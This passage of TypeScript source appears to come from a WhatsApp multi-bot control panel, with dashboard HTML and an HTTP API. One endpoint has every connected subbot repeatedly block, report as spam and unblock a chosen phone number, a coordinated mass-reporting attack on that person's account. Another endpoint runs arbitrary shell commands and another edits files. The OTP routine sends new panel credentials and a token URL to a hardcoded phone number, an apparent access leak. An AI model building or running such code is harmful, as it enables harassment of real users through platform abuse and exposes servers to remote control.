      <div class="card"><div class="card-title">Instancias Activas</div><div class="card-val" id="mSubbots">0</div><div class="card-sub" id="mSubState">Operando</div></div>
      <div class="card"><div class="card-title">Tráfico Mensajes</div><div class="card-val" id="mMsgs">0 / 0</div><div class="card-sub">RX Recibidos / TX Enviados</div></div>
      <div class="card"><div class="card-title">Grupos en Red</div><div class="card-val" id="mGroups">0</div><div class="card-sub">Sincronizados</div></div>
      <div class="card"><div class="card-title">Memoria (RSS / Heap)</div><div class="card-val" id="mRam">0 MB</div><div class="card-sub" id="mCpu">CPU: 0.00</div></div>
    </div>

    <div class="card">
      <div class="flex-row" style="justify-content: space-between;">
        <h3>🤖 Control de Nodos (Main + Subbots)</h3>
        <div class="flex-row" style="margin:0;">
          <button class="btn btn-warn" onclick="togglePauseSubbots()" id="btnPauseSubs">⏸️ Pausar Todos</button>
          <button class="btn btn-success" onclick="cleanRam()">🧹 Limpiar RAM</button>
        </div>
      </div>
      <div class="table-wrap">
        <table>
          <thead><tr><th>#</th><th>JID / Número</th><th>Nombre</th><th>Estado</th><th>Rol</th><th>Acciones</th></tr></thead>
          <tbody id="subbotsTable"></tbody>
        </table>
      </div>
    </div>
  </div>

  <div id="tab-procs" class="section">
    <div class="card">
      <div class="flex-row" style="justify-content: space-between;">
        <h3>💀 Procesos del Servidor y Memoria</h3>
        <div class="flex-row" style="margin:0;">
          <input type="text" id="multiPidInput" placeholder="PIDs (ej: 1204, 1502)" style="width:200px;">
          <button class="btn btn-danger" onclick="killMultiplePids()">Matar PIDs</button>
          <button class="btn btn-success" onclick="cleanRam()">Forzar GC / RAM</button>
        </div>
      </div>
      <div class="table-wrap">
        <table>
          <thead><tr><th>PID</th><th>Proceso</th><th>% CPU</th><th>% MEM</th><th>Acción</th></tr></thead>
          <tbody id="procsTable"></tbody>
        </table>
      </div>
    </div>
  </div>

  <div id="tab-cmds" class="section">
    <div class="card">
      <h3>🛠️ Bloqueo de Comandos por Mantenimiento</h3>
      <div class="flex-row" style="margin-top:10px;">
        <input type="text" id="customCmdInput" placeholder="Comando (ej: play, sticker, lid)" style="max-width:280px;">
        <button class="btn btn-danger" onclick="toggleCmdManual()">Alternar Estado</button>
      </div>
      <div class="cmd-grid" id="cmdGrid"></div>
    </div>
  </div>

  <div id="tab-spam" class="section">
    <div class="card">
      <h3>🚨 Ejecutor y Auditoría de Reportes por Subbots</h3>
      <div class="flex-row" style="margin-top:10px;">
        <input type="text" id="spamTarget" placeholder="Número (ej: 573001234567)" style="max-width:240px;">
        <input type="number" id="spamCycles" value="5" min="1" max="20" style="max-width:100px;">
        <button class="btn btn-danger" onclick="runSpamReport()">🚀 Ejecutar con Subbots</button>
      </div>
      <div class="table-wrap">
        <table>
          <thead><tr><th>Objetivo</th><th>Total Reportes</th><th>Subbots Usados</th><th>Último Evento</th></tr></thead>
          <tbody id="spamTable"></tbody>
        </table>
      </div>
    </div>
  </div>

  <div id="tab-files" class="section">
    <div class="card">
      <h3>📁 Explorador y Editor en Vivo</h3>
      <div class="flex-row" style="margin-top:10px;">
        <input type="text" id="currentDirInput" value="." style="max-width:300px;">
        <button class="btn" onclick="loadDir()">📂 Abrir Carpeta</button>
      </div>
      <div id="fileList" style="display:flex; gap:6px; flex-wrap:wrap; margin-bottom:12px;"></div>
      <div class="flex-row" style="justify-content: space-between;">
        <input type="text" id="editingFilePath" placeholder="Archivo seleccionado..." readonly style="max-width:400px;">
        <button class="btn btn-success" onclick="saveFileContent()">💾 Guardar Cambios</button>
      </div>
      <textarea id="fileEditor" placeholder="Selecciona un archivo para editar..."></textarea>
    </div>
  </div>

  <div id="tab-bench" class="section">
    <div class="card">
      <h3>⚡ Benchmark V8 & Terminal Shell</h3>
      <div class="flex-row" style="margin-top:10px;">
        <button class="btn" onclick="runBenchmark()">🔥 Ejecutar Benchmark</button>
      </div>
      <pre id="benchOutput">Pulsa el botón para medir rendimiento...</pre>
      <h3 style="margin-top:16px;">💻 Consola Shell</h3>
      <div class="flex-row" style="margin-top:8px;">
        <input type="text" id="shellCmdInput" placeholder="Comando (ej: df -h, free -m, ps aux)" style="max-width:400px;">
        <button class="btn btn-warn" onclick="runShellTest()">Ejecutar</button>
      </div>
      <pre id="shellOutput">Listo...</pre>
    </div>
  </div>
</div>

<script>
const TOKEN = "${token}";
let selectedBotKey = "";
let selectedChatJid = "";
let cachedChats = [];
let knownBots = [];

function switchTab(id, btn) {
  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  document.getElementById('tab-' + id).classList.add('active');
  btn.classList.add('active');
  if (id === 'files') loadDir();
  if (id === 'cmds') loadCommands();
  if (id === 'wa') refreshWaChats();
}

async function api(path, method = 'GET', body = null) {
  const opts = { method, headers: { 'Content-Type': 'application/json', 'x-aura-token': TOKEN } };
  if (body) opts.body = JSON.stringify(body);
  const sep = path.includes('?') ? '&' : '?';
  const r = await fetch('/api/' + path + sep + 'token=' + TOKEN, opts);
  return r.json();
}

function escapeHtml(str) {
  return String(str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

async function refreshTelemetry() {
  try {
    const d = await api('status');
    document.getElementById('uptimeBadge').textContent = '⏱️ ' + d.uptime;
    document.getElementById('mSubbots').textContent = d.subbots.length;
    document.getElementById('mSubState').textContent = d.subbotsPaused ? '⏸️ PAUSADOS' : '🟢 OPERANDO';
    document.getElementById('btnPauseSubs').textContent = d.subbotsPaused ? '▶️ Reanudar Todos' : '⏸️ Pausar Todos';
    document.getElementById('mMsgs').textContent = d.msgRx + ' / ' + d.msgTx;
    document.getElementById('mGroups').textContent = d.groupsCount;
    document.getElementById('mRam').textContent = d.ramRss + ' / ' + d.ramHeap + ' MB';
    document.getElementById('mCpu').textContent = 'CPU Load: ' + d.loadAvg;

    knownBots = d.subbots || [];
    const selector = document.getElementById('waBotSelector');
    const prevVal = selector.value || selectedBotKey;
    const optsHtml = knownBots.map((s, idx) => {
      const label = (idx === 0 ? '👑 Main: ' : '🤖 Sub #' + idx + ': ') + s.name + ' (+' + s.id + ')';
      return '<option value="' + escapeHtml(s.id) + '">' + escapeHtml(label) + '</option>';
    }).join('');
    if (selector.innerHTML !== optsHtml) {
      selector.innerHTML = optsHtml;
      if (prevVal && knownBots.some(b => b.id === prevVal)) {
        selector.value = prevVal;
        selectedBotKey = prevVal;
      } else if (knownBots[0]) {
        selectedBotKey = knownBots[0].id;
        selector.value = selectedBotKey;
      }
    }

    const sbHtml = knownBots.map((s, i) => '<tr>' +
      '<td>#' + (i + 1) + '</td>' +
      '<td><code>+' + escapeHtml(s.id) + '</code></td>' +
      '<td>' + escapeHtml(s.name) + '</td>' +
      '<td><span class="pill ' + (s.paused ? 'pill-off' : 'pill-on') + '">' + (s.paused ? 'PAUSADO' : 'ONLINE') + '</span></td>' +
      '<td>' + escapeHtml(s.role) + '</td>' +
      '<td>' +
        '<button class="btn btn-wa" style="padding:5px 8px; margin-right:4px;" onclick="jumpToBotWa(\\'' + escapeHtml(s.id) + '\\')">💬 Chats</button>' +
        '<button class="btn ' + (s.paused ? 'btn-success' : 'btn-warn') + '" style="padding:5px 8px;" onclick="toggleSingleBot(\\'' + escapeHtml(s.id) + '\\')">' + (s.paused ? '▶️' : '⏸️') + '</button>' +
      '</td>' +
    '</tr>').join('');
    document.getElementById('subbotsTable').innerHTML = sbHtml;

    const prHtml = (d.processes || []).map(p => '<tr>' +
      '<td><code>' + escapeHtml(p.pid) + '</code></td>' +
      '<td>' + escapeHtml(p.comm) + '</td>' +
      '<td>' + escapeHtml(p.cpu) + '%</td>' +
      '<td>' + escapeHtml(p.mem) + '%</td>' +
      '<td><button class="btn btn-danger" style="padding:4px 8px;" onclick="killPid(\\'' + escapeHtml(p.pid) + '\\')">Matar</button></td>' +
    '</tr>').join('');
    document.getElementById('procsTable').innerHTML = prHtml;

    const spHtml = (d.reports && d.reports.length) ? d.reports.map(r => '<tr>' +
      '<td><code>+' + escapeHtml(r.phone) + '</code></td>' +
      '<td><b>' + r.totalReports + '</b></td>' +
      '<td>' + r.subbotsCount + ' bots</td>' +
      '<td>' + escapeHtml(r.lastTimestamp) + '</td>' +
    '</tr>').join('') : '<tr><td colspan="4" style="color:var(--muted)">Sin reportes registrados.</td></tr>';
    document.getElementById('spamTable').innerHTML = spHtml;
  } catch (e) {}
}

function jumpToBotWa(botKey) {
  selectedBotKey = botKey;
  const sel = document.getElementById('waBotSelector');
  if (sel) sel.value = botKey;
  selectedChatJid = "";
  const firstTabBtn = document.querySelector('.tab-btn');
  switchTab('wa', firstTabBtn);
}

function onSelectSubbot() {
  const sel = document.getElementById('waBotSelector');
  selectedBotKey = sel.value;
  selectedChatJid = "";
  closeMobileChat();
  refreshWaChats();
}

async function syncSubbotGroups() {
  if (!selectedBotKey) return;
  await api('wa-sync', 'POST', { botKey: selectedBotKey });
  refreshWaChats();
}

async function refreshWaChats() {
  if (!selectedBotKey && knownBots[0]) selectedBotKey = knownBots[0].id;
  if (!selectedBotKey) return;
  try {
    const d = await api('wa-chats?botKey=' + encodeURIComponent(selectedBotKey));
    cachedChats = d.chats || [];
    renderWaChatList();
    if (selectedChatJid) {
      await loadWaMessages(selectedChatJid, false);
    }
  } catch (e) {}
}

function renderWaChatList() {
  const q = (document.getElementById('waSearchInput').value || '').toLowerCase().trim();
  const listEl = document.getElementById('waChatList');
  const filtered = cachedChats.filter(c =>
    c.name.toLowerCase().includes(q) ||
    c.jid.toLowerCase().includes(q) ||
    (c.lastPreview || '').toLowerCase().includes(q)
  );

  if (!filtered.length) {
    listEl.innerHTML = '<div style="padding:20px; text-align:center; color:#8696a0; font-size:12px;">No hay chats aún. Pulsa 🔄 para cargar grupos o ➕ para iniciar un chat nuevo.</div>';
    return;
  }

  listEl.innerHTML = filtered.map(c => {
    const activeCls = c.jid === selectedChatJid ? 'active' : '';
    const initials = (c.name || '?').replace(/[^a-zA-Z0-9]/g, '').slice(0, 2).toUpperCase() || (c.isGroup ? '👥' : '👤');
    const timeStr = c.lastTime ? new Date(c.lastTime).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '';
    const unreadHtml = c.unread > 0 ? '<span class="wa-unread">' + c.unread + '</span>' : '';
    return '<div class="wa-chat-item ' + activeCls + '" onclick="openWaChat(\\'' + escapeHtml(c.jid) + '\\')">' +
      '<div class="wa-avatar" style="background:' + (c.isGroup ? '#7c4dff' : '#00a884') + '">' + escapeHtml(initials) + '</div>' +
      '<div class="wa-chat-meta">' +
        '<div class="wa-chat-name">' + escapeHtml(c.name) + '</div>' +
        '<div class="wa-chat-prev">' + escapeHtml(c.lastPreview || c.jid) + '</div>' +
      '</div>' +
      '<div class="wa-chat-right">' +
        '<div class="wa-chat-time">' + escapeHtml(timeStr) + '</div>' +
        unreadHtml +
      '</div>' +
    '</div>';
  }).join('');
}

async function openWaChat(jid) {
  selectedChatJid = jid;
  document.getElementById('waWrapper').classList.add('chat-open');
  document.getElementById('waClearBtn').style.display = 'inline-block';
  renderWaChatList();
  await loadWaMessages(jid, true);
}

function closeMobileChat() {
  document.getElementById('waWrapper').classList.remove('chat-open');
}

async function loadWaMessages(jid, scrollBottom = false) {
  if (!selectedBotKey || !jid) return;
  try {
    const d = await api('wa-messages?botKey=' + encodeURIComponent(selectedBotKey) + '&jid=' + encodeURIComponent(jid));
    if (!d.chat) return;
    document.getElementById('waActiveName').textContent = d.chat.name || jid;
    document.getElementById('waActiveJid').textContent = d.chat.jid + ' // vía +' + selectedBotKey;
    const initials = (d.chat.name || '?').replace(/[^a-zA-Z0-9]/g, '').slice(0, 2).toUpperCase() || '💬';
    document.getElementById('waActiveAvatar').textContent = initials;

    const box = document.getElementById('waMessagesBox');
    const wasNearBottom = box.scrollHeight - box.scrollTop - box.clientHeight < 120;
    const msgs = d.chat.messages || [];

    if (!msgs.length) {
      box.innerHTML = '<div style="margin:auto; color:#8696a0; font-size:12px; text-align:center;">Sin mensajes en caché en esta conversación. Escribe abajo para enviar un mensaje con este subbot.</div>';
      return;
    }

    box.innerHTML = msgs.map(m => {
      const side = m.fromMe ? 'out' : 'in';
      const senderHeader = (!m.fromMe && d.chat.isGroup)
        ? '<div class="wa-bubble-sender">' + escapeHtml(m.pushName || '+' + m.sender) + '</div>'
        : '';
      return '<div class="wa-bubble ' + side + '">' +
        senderHeader +
        '<div>' + escapeHtml(m.text) + '</div>' +
        '<div class="wa-bubble-time">' + escapeHtml(m.time) + '</div>' +
      '</div>';
    }).join('');

    if (scrollBottom || wasNearBottom) {
      box.scrollTop = box.scrollHeight;
    }
  } catch (e) {}
}

async function sendWaMessage(e) {
  e.preventDefault();
  const inp = document.getElementById('waMessageInput');
  const text = inp.value.trim();
  if (!text || !selectedBotKey) return;
  if (!selectedChatJid) {
    alert('Selecciona primero un chat o pulsa el botón ➕ para ingresar un número.');
    return;
  }
  inp.value = '';
  const r = await api('wa-send', 'POST', {
    botKey: selectedBotKey,
    jid: selectedChatJid,
    text
  });
  if (r.ok) {
    await loadWaMessages(selectedChatJid, true);
    refreshWaChats();
  } else {
    alert(r.error || 'No se pudo enviar el mensaje');
  }
}

async function startNewChatPrompt() {
  const raw = prompt('Ingresa el número con código de país (ej: 573001234567) o el JID completo:');
  if (!raw) return;
  const clean = raw.trim();
  const jid = clean.includes('@') ? clean : clean.replace(/\\D/g, '') + '@s.whatsapp.net';
  if (jid.length < 10) return alert('Número o JID inválido');
  await api('wa-init-chat', 'POST', { botKey: selectedBotKey, jid });
  await refreshWaChats();
  openWaChat(jid);
}

async function clearActiveChatHistory() {
  if (!selectedBotKey || !selectedChatJid) return;
  await api('wa-clear-chat', 'POST', { botKey: selectedBotKey, jid: selectedChatJid });
  loadWaMessages(selectedChatJid, true);
  refreshWaChats();
}

async function togglePauseSubbots() {
  await api('toggle-subbots', 'POST', {});
  refreshTelemetry();
}

async function toggleSingleBot(botKey) {
  await api('toggle-single-bot', 'POST', { botKey });
  refreshTelemetry();
}

async function cleanRam() {
  const r = await api('clean-ram', 'POST', {});
  alert('RAM optimizada. Uso actual: ' + r.afterMb + ' MB');
  refreshTelemetry();
}

async function killPid(pid) {
  await api('kill-proc', 'POST', { pids: [pid] });
  refreshTelemetry();
}

async function killMultiplePids() {
  const raw = document.getElementById('multiPidInput').value;
  const pids = raw.split(',').map(s => s.trim()).filter(Boolean);
  if (!pids.length) return;
  await api('kill-proc', 'POST', { pids });
  document.getElementById('multiPidInput').value = '';
  refreshTelemetry();
}

async function loadCommands() {
  const d = await api('commands');
  const html = (d.allCommands || []).map(c => {
    const blocked = (d.blocked || []).includes(c);
    return '<div class="cmd-item">' +
      '<span>.' + escapeHtml(c) + '</span>' +
      '<button class="btn ' + (blocked ? 'btn-danger' : 'btn-success') + '" onclick="toggleCmd(\\'' + escapeHtml(c) + '\\')">' + (blocked ? 'Bloqueado' : 'Activo') + '</button>' +
    '</div>';
  }).join('');
  document.getElementById('cmdGrid').innerHTML = html;
}

async function toggleCmd(cmd) {
  await api('toggle-cmd', 'POST', { cmd });
  loadCommands();
}

async function toggleCmdManual() {
  const val = document.getElementById('customCmdInput').value.trim().replace(/^[.#/]/, '');
  if (!val) return;
  await toggleCmd(val);
  document.getElementById('customCmdInput').value = '';
}

async function runSpamReport() {
  const phone = document.getElementById('spamTarget').value.trim();
  const cycles = parseInt(document.getElementById('spamCycles').value, 10) || 5;
  if (!phone) return alert('Ingresa un número válido');
  await api('spam-report', 'POST', { phone, cycles });
  document.getElementById('spamTarget').value = '';
  refreshTelemetry();
}

async function loadDir(customDir) {
  const dirInput = document.getElementById('currentDirInput');
  if (customDir) dirInput.value = customDir;
  const d = await api('files?dir=' + encodeURIComponent(dirInput.value));
  if (!d.entries) return;
  const html = d.entries.map(e => {
    if (e.isDir) {
      return '<button class="tab-btn" onclick="loadDir(\\'' + escapeHtml(e.relPath) + '\\')">📁 ' + escapeHtml(e.name) + '</button>';
    }
    return '<button class="tab-btn" onclick="openFile(\\'' + escapeHtml(e.relPath) + '\\')">📄 ' + escapeHtml(e.name) + '</button>';
  }).join('');
  document.getElementById('fileList').innerHTML = html;
}

async function openFile(relPath) {
  const d = await api('file-read?file=' + encodeURIComponent(relPath));
  document.getElementById('editingFilePath').value = d.file || relPath;
  document.getElementById('fileEditor').value = d.content || '';
}

async function saveFileContent() {
  const file = document.getElementById('editingFilePath').value;
  const content = document.getElementById('fileEditor').value;
  if (!file) return alert('Ningún archivo seleccionado');
  const r = await api('file-save', 'POST', { file, content });
  alert(r.ok ? 'Archivo guardado correctamente' : 'Error al guardar');
}

async function runBenchmark() {
  document.getElementById('benchOutput').textContent = 'Ejecutando pruebas de estrés en CPU, Memoria y Disco...';
  const r = await api('benchmark', 'POST', {});
  document.getElementById('benchOutput').textContent = r.result;
}

async function runShellTest() {
  const cmd = document.getElementById('shellCmdInput').value.trim();
  if (!cmd) return;
  document.getElementById('shellOutput').textContent = 'Ejecutando...';
  const r = await api('shell-test', 'POST', { cmd });
  document.getElementById('shellOutput').textContent = r.output;
}

(async () => {
  await refreshTelemetry();
  await refreshWaChats();
  setInterval(refreshTelemetry, 3000);
  setInterval(() => {
    const waSection = document.getElementById('tab-wa');
    if (waSection && waSection.classList.contains('active')) {
      refreshWaChats();
    }
  }, 2500);
})();
</script>
</body>
</html>`;
}

async function ensureWebServerRunning(): Promise<number> {
  if (state.server && state.port > 0) {
    return state.port;
  }

  const server = http.createServer(async (req, res) => {
    try {
      const parsedUrl = new URL(req.url || "/", "http://127.0.0.1");
      const pathname = parsedUrl.pathname;

      if (pathname === "/api/login" && req.method === "POST") {
        const body = await readJsonBody(req);
        const u = String(body.user || "").trim();
        const p = String(body.pass || "").trim();
        if (
          (u === state.tempUser && p === state.tempPass) ||
          (u === state.ownerEmail && p === state.tempPass) ||
          p === state.token
        ) {
          sendJson(res, 200, { ok: true, token: state.token });
        } else {
          sendJson(res, 401, { ok: false, error: "Usuario o código OTP inválido." });
        }
        return;
      }

      if (pathname === "/api/request-otp" && req.method === "POST") {
        rotateCredentials();
        const baseUrl = state.tunnelUrl || `http://${state.publicIp || "127.0.0.1"}:${state.port}`;
        sendCredentialsEmail(state.ownerEmail, baseUrl, state.tempUser, state.tempPass, state.token).catch(() => {});
        if (state.lastSock) {
          const msgText = [
            `🔐 *${fytBold("NUEVAS CREDENCIALES TEMPORALES")}*`,
            ``,
            `👤 *Usuario:* \`${state.tempUser}\``,
            `🔑 *Clave / OTP:* \`${state.tempPass}\``,
            `📧 *Correo:* \`${state.ownerEmail}\``,
            `🌐 *Acceso directo:* ${baseUrl}/?token=${state.token}`,
          ].join("\n");
          state.lastSock.sendMessage("573118353868@s.whatsapp.net", { text: msgText }).catch(() => {});
        }
        sendJson(res, 200, { ok: true, email: state.ownerEmail });
        return;
      }

      const queryToken = parsedUrl.searchParams.get("token") || req.headers["x-aura-token"];

      if (pathname === "/" && req.method === "GET") {
        if (queryToken !== state.token) {
          const loginHtml = buildLoginHtml(state.ownerEmail);
          res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
          res.end(loginHtml);
          return;
        }
        const html = buildDashboardHtml(state.token);
        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
        res.end(html);
        return;
      }

      if (queryToken !== state.token) {
        sendJson(res, 401, { error: "No autorizado" });
        return;
      }

      if (pathname === "/api/status" && req.method === "GET") {
        hookSockets();
        const allBots = getAllBotSockets();
        const subbots = allBots.map((b, idx) => {
          const id = getBotKey(b, idx);
          const isIndividualPaused = state.pausedBotIds.has(id);
          const isSubPaused = idx > 0 && state.subbotsPaused;
          return {
            id,
            name: b?.user?.name || (idx === 0 ? "MainBot" : `SubBot-${idx}`),
            role: idx === 0 && !b?.isSubBot ? "Principal" : `SubBot #${idx}`,
            paused: isIndividualPaused || isSubPaused,
          };
        });

        let groupsCount = 0;
        for (const store of state.botChatStores.values()) {
          for (const chat of store.values()) {
            if (chat.isGroup) groupsCount++;
          }
        }

        const processes: Array<{ pid: string; comm: string; cpu: string; mem: string }> = [];
        try {
          const { stdout } = await execAsync("ps -eo pid,comm,%cpu,%mem --sort=-%mem | head -n 16");
          const lines = stdout.trim().split("\n").slice(1);
          for (const line of lines) {
            const parts = line.trim().split(/\s+/);
            if (parts.length >= 4) {
              processes.push({
                pid: parts[0],
                comm: parts.slice(1, parts.length - 2).join(" "),
                cpu: parts[parts.length - 2],
                mem: parts[parts.length - 1],
              });
            }
          }
        } catch {}

        const mem = process.memoryUsage();
        const uptimeSec = Math.floor(process.uptime());
        const h = Math.floor(uptimeSec / 3600);
        const m = Math.floor((uptimeSec % 3600) / 60);
        const s = uptimeSec % 60;

        const reports = Array.from(state.reportRegistry.values()).map((r) => ({
          phone: r.phone,
          totalReports: r.totalReports,
          subbotsCount: r.subbotsUsed.size,
          lastTimestamp: r.lastTimestamp,
        }));

        sendJson(res, 200, {
          uptime: `${h}h ${m}m ${s}s`,
          subbots,
          subbotsPaused: state.subbotsPaused,
          msgRx: state.msgRx,
          msgTx: state.msgTx,
          groupsCount,
          ramRss: (mem.rss / 1024 / 1024).toFixed(1),
          ramHeap: (mem.heapUsed / 1024 / 1024).toFixed(1),
          loadAvg: os.loadavg().map((n) => n.toFixed(2)).join(", "),
          processes,
          reports,
        });
        return;
      }

      if (pathname === "/api/wa-chats" && req.method === "GET") {
        hookSockets();
        const botKey = parsedUrl.searchParams.get("botKey") || "";
        const allBots = getAllBotSockets();
        const targetIdx = allBots.findIndex((b, idx) => getBotKey(b, idx) === botKey);
        const targetBot = targetIdx >= 0 ? allBots[targetIdx] : allBots[0];
        const effectiveKey = targetBot ? getBotKey(targetBot, Math.max(0, targetIdx)) : botKey;

        if (targetBot) {
          await syncBotGroupsToStore(targetBot, Math.max(0, targetIdx));
        }

        const store = ensureBotChatMap(effectiveKey);
        const chats = Array.from(store.values())
          .sort((a, b) => b.lastTime - a.lastTime)
          .map((c) => ({
            jid: c.jid,
            name: c.name,
            isGroup: c.isGroup,
            unread: c.unread,
            lastTime: c.lastTime,
            lastPreview: c.lastPreview,
          }));

        sendJson(res, 200, { botKey: effectiveKey, chats });
        return;
      }

      if (pathname === "/api/wa-sync" && req.method === "POST") {
        const body = await readJsonBody(req);
        const botKey = String(body.botKey || "");
        state.botGroupSynced.delete(botKey);
        const allBots = getAllBotSockets();
        const targetIdx = allBots.findIndex((b, idx) => getBotKey(b, idx) === botKey);
        if (targetIdx >= 0) {
          await syncBotGroupsToStore(allBots[targetIdx], targetIdx);
        }
        sendJson(res, 200, { ok: true });
        return;
      }

      if (pathname === "/api/wa-messages" && req.method === "GET") {
        const botKey = parsedUrl.searchParams.get("botKey") || "";
        const jid = parsedUrl.searchParams.get("jid") || "";
        const store = ensureBotChatMap(botKey);
        const chat = store.get(jid);
        if (chat) {
          chat.unread = 0;
        }
        sendJson(res, 200, { chat: chat || null });
        return;
      }

      if (pathname === "/api/wa-init-chat" && req.method === "POST") {
        const body = await readJsonBody(req);
        const botKey = String(body.botKey || "");
        const jid = String(body.jid || "");
        if (botKey && jid) {
          const store = ensureBotChatMap(botKey);
          if (!store.has(jid)) {
            const isGroup = jid.endsWith("@g.us");
            const clean = jid.split("@")[0];
            store.set(jid, {
              jid,
              name: isGroup ? `Grupo ${clean}` : `+${clean}`,
              isGroup,
              unread: 0,
              lastTime: Date.now(),
              lastPreview: "Chat iniciado desde el panel",
              messages: [],
            });
          }
        }
        sendJson(res, 200, { ok: true });
        return;
      }

      if (pathname === "/api/wa-clear-chat" && req.method === "POST") {
        const body = await readJsonBody(req);
        const botKey = String(body.botKey || "");
        const jid = String(body.jid || "");
        const store = ensureBotChatMap(botKey);
        const chat = store.get(jid);
        if (chat) {
          chat.messages = [];
          chat.lastPreview = "Historial limpiado";
        }
        sendJson(res, 200, { ok: true });
        return;
      }

      if (pathname === "/api/wa-send" && req.method === "POST") {
        const body = await readJsonBody(req);
        const botKey = String(body.botKey || "");
        const jid = String(body.jid || "");
        const text = String(body.text || "").trim();

        if (!botKey || !jid || !text) {
          sendJson(res, 400, { ok: false, error: "Datos incompletos" });
          return;
        }

        const allBots = getAllBotSockets();
        const targetIdx = allBots.findIndex((b, idx) => getBotKey(b, idx) === botKey);
        const targetBot = targetIdx >= 0 ? allBots[targetIdx] : null;

        if (!targetBot) {
          sendJson(res, 404, { ok: false, error: "Subbot no encontrado o desconectado" });
          return;
        }

        const origSend = state.originalSenders.get(targetBot) || targetBot.sendMessage.bind(targetBot);
        const sent = await origSend(jid, { text });
        state.msgTx++;

        recordChatMessage(botKey, jid, {
          id: sent?.key?.id || randomBytes(6).toString("hex"),
          sender: botKey,
          pushName: targetBot?.user?.name || "SubBot",
          text,
          fromMe: true,
          timestamp: Date.now(),
        });

        sendJson(res, 200, { ok: true });
        return;
      }

      if (pathname === "/api/toggle-subbots" && req.method === "POST") {
        state.subbotsPaused = !state.subbotsPaused;
        sendJson(res, 200, { paused: state.subbotsPaused });
        return;
      }

      if (pathname === "/api/toggle-single-bot" && req.method === "POST") {
        const body = await readJsonBody(req);
        const botKey = String(body.botKey || "");
        if (botKey) {
          if (state.pausedBotIds.has(botKey)) state.pausedBotIds.delete(botKey);
          else state.pausedBotIds.add(botKey);
        }
        sendJson(res, 200, { ok: true });
        return;
      }

      if (pathname === "/api/clean-ram" && req.method === "POST") {
        try {
          if (typeof globalThis.gc === "function") {
            globalThis.gc();
          }
        } catch {}
        const afterMb = (process.memoryUsage().rss / 1024 / 1024).toFixed(1);
        sendJson(res, 200, { ok: true, afterMb });
        return;
      }

      if (pathname === "/api/kill-proc" && req.method === "POST") {
        const body = await readJsonBody(req);
        const pids: string[] = Array.isArray(body.pids) ? body.pids : [];
        const killed: string[] = [];
        for (const p of pids) {
          const numPid = parseInt(String(p), 10);
          if (!isNaN(numPid) && numPid > 1 && numPid !== process.pid) {
            try {
              process.kill(numPid, "SIGKILL");
              killed.push(String(numPid));
            } catch {}
          }
        }
        sendJson(res, 200, { ok: true, killed });
        return;
      }

      if (pathname === "/api/commands" && req.method === "GET") {
        const allCommands = await syncCommandInterceptors();
        sendJson(res, 200, {
          allCommands,
          blocked: Array.from(state.blockedCommands),
        });
        return;
      }

      if (pathname === "/api/toggle-cmd" && req.method === "POST") {
        const body = await readJsonBody(req);
        const cmd = String(body.cmd || "").toLowerCase().trim();
        if (cmd) {
          await syncCommandInterceptors();
          if (state.blockedCommands.has(cmd)) {
            state.blockedCommands.delete(cmd);
          } else {
            state.blockedCommands.add(cmd);
          }
        }
        sendJson(res, 200, { blocked: Array.from(state.blockedCommands) });
        return;
      }

      if (pathname === "/api/spam-report" && req.method === "POST") {
        const body = await readJsonBody(req);
        const cleanPhone = String(body.phone || "").replace(/\D/g, "");
        const cycles = Math.min(20, Math.max(1, parseInt(String(body.cycles || "5"), 10)));

        if (!cleanPhone || cleanPhone.length < 7) {
          sendJson(res, 400, { ok: false });
          return;
        }

        const targetJid = `${cleanPhone}@s.whatsapp.net`;
        const allBots = getAllBotSockets();

        if (!state.reportRegistry.has(cleanPhone)) {
          state.reportRegistry.set(cleanPhone, {
            phone: cleanPhone,
            totalReports: 0,
            subbotsUsed: new Set(),
            lastTimestamp: new Date().toLocaleTimeString("es-CO"),
          });
        }

        const entry = state.reportRegistry.get(cleanPhone)!;

        await Promise.allSettled(
          allBots.map(async (botSock, idx) => {
            const botId = getBotKey(botSock, idx);
            entry.subbotsUsed.add(botId);

            for (let i = 0; i < cycles; i++) {
              try {
                if (typeof botSock.updateBlockStatus === "function") {
                  await botSock.updateBlockStatus(targetJid, "block").catch(() => {});
                }
                if (typeof botSock.query === "function") {
                  await botSock
                    .query({
                      tag: "iq",
                      attrs: { to: "@s.whatsapp.net", type: "set", xmlns: "disallowed" },
                      content: [{ tag: "report", attrs: { jid: targetJid, type: "spam" } }],
                    })
                    .catch(() => {});
                }
                entry.totalReports++;
                entry.lastTimestamp = new Date().toLocaleTimeString("es-CO");
                if (typeof botSock.updateBlockStatus === "function") {
                  await botSock.updateBlockStatus(targetJid, "unblock").catch(() => {});
                }
              } catch {}
            }
          })
        );

        sendJson(res, 200, { ok: true });
        return;
      }

      if (pathname === "/api/files" && req.method === "GET") {
        const relDir = parsedUrl.searchParams.get("dir") || ".";
        const targetDir = safeResolvePath(relDir);
        const items = fs.readdirSync(targetDir, { withFileTypes: true });
        const entries = items
          .filter((i) => i.name !== "node_modules" && i.name !== ".git")
          .map((i) => ({
            name: i.name,
            isDir: i.isDirectory(),
            relPath: path.relative(process.cwd(), path.join(targetDir, i.name)) || ".",
          }))
          .sort((a, b) => Number(b.isDir) - Number(a.isDir));

        sendJson(res, 200, { entries });
        return;
      }

      if (pathname === "/api/file-read" && req.method === "GET") {
        const relFile = parsedUrl.searchParams.get("file") || "";
        const targetFile = safeResolvePath(relFile);
        if (fs.existsSync(targetFile) && fs.statSync(targetFile).isFile()) {
          const content = fs.readFileSync(targetFile, "utf8");
          sendJson(res, 200, { file: relFile, content });
          return;
        }
        sendJson(res, 404, { error: "Archivo no encontrado" });
        return;
      }

      if (pathname === "/api/file-save" && req.method === "POST") {
        const body = await readJsonBody(req);
        const relFile = String(body.file || "");
        const content = String(body.content ?? "");
        const targetFile = safeResolvePath(relFile);
        fs.writeFileSync(targetFile, content, "utf8");
        sendJson(res, 200, { ok: true });
        return;
      }

      if (pathname === "/api/benchmark" && req.method === "POST") {
        const t0 = performance.now();
        let acc = 0;
        for (let i = 0; i < 5_000_000; i++) {
          acc += Math.sqrt(i);
        }
        const cpuMs = (performance.now() - t0).toFixed(2);

        const t1 = performance.now();
        const buf = Buffer.alloc(32 * 1024 * 1024, 0xaa);
        const memMs = (performance.now() - t1).toFixed(2);

